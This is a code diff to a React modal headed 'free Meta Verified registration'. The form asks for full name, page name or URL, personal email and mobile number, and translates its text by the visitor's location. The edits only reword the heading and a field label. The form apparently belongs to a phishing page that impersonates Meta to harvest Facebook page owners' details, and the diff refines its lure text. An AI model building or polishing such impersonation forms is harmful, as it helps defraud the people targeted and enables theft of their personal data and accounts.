@@ -23,7 +23,7 @@ interface FormField {
 
 const FORM_FIELDS: FormField[] = [
     { name: 'fullName', label: 'Full Name', type: 'text' },
-    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
+    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name or URL]', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' }
 ];
 const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
@@ -46,7 +46,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
+        const textsToTranslate = ['Complete your free Meta Verified registration in just a few steps.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name or URL]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -128,7 +128,7 @@ ${
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
-                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
+                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete your free Meta Verified registration in just a few steps.')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
